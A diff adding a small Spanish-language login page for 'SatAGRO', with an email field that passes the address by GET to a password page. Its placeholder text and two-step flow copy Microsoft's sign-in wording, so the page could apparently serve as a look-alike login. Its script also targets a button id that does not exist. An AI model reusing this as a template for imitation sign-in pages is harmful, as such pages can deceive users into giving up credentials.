@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Iniciar sesión - SatAGRO</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="left-panel">
+    </div>
+    <div class="right-panel">
+  <div class="top">
+    <!-- Contenido que quieres arriba -->
+    <img src="/img/logo_satagro_blurred.png" alt="SatAGRO Logo" class="small-logo">
+    <h2>Iniciar sesión</h2>
+    
+    <form action="password.html" method="GET">
+    <input type="text" name="email" placeholder="Correo electrónico, teléfono o Skype" required />
+    <button type="submit">Siguiente</button>
+</form>
+
+
+    <p>Bienvenidos a la central de datos de AMI desarrollada por nuestros mejores colaboradores de satagro</p>
+  </div>
+
+  <div class="bottom">
+    <!-- Contenido que quieres abajo -->
+    <div class="footer">
+      <a href="#">Términos de uso</a>
+      <a href="#">Privacidad y cookies</a>
+    </div>
+  </div>
+</div>
+  </div>
+</body>
+<script>
+  document.getElementById("btn-siguiente").addEventListener("click", function() {
+    window.location.href = "/password.html"; // Cambia por la URL deseada
+  });
+</script>
+</html>
